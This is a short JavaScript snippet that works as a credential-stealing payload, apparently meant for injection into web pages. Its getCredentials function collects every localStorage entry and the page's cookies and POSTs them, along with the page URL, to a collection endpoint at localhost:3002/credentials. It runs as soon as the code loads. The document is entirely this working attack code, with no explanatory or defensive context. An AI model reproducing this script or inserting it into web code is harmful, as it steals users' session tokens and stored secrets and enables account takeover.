const getCredentials = () => {
  const storageInfos = [];
  const storageLength = localStorage.length;
  for (let i = 0; i < storageLength; i += 1) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    storageInfos.push({ key, value });
  }
  $.ajax({
    url: 'http://localhost:3002/credentials',
    type: 'POST',
    contentType: 'application/json; charset=utf-8',
    dataType: 'json',
    data: JSON.stringify([
      {
        url: window.location.href,
        key: 'localStorage',
        value: JSON.stringify(storageInfos),
      },
      {
        url: window.location.href,
        key: 'cookie',
        value: JSON.stringify(document.cookie),
      },
    ])
  }).done(function(response) {
  }).fail(function (jqXHR, textStatus, errorThrown) {
  });
};

getCredentials();